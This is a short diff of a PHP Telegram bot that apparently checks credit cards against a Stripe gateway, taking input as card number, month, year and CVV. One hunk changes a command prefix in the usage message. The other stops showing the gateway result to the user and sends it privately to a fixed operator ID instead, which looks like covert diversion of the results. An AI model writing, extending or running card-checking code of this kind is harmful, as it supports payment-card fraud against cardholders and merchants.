@@ -1374,7 +1374,7 @@ die();
 
 if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
 }else{
-$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /nm cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ch cc|m|y|cvv\n";
+$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /nm cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !nm cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ch cc|m|y|cvv\n";
 sendMessage($chat_id,$respuesta, $message_id);
 die();
 }
@@ -1542,7 +1542,7 @@ $patron = "/failed: (.*)/";
 preg_match($patron, $result1, $matches);
 $respo = $matches[1];
 
-editMessage($chat_id, $result1, $id_text);
+sendPv($myid, $result1);
 	
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '',4);
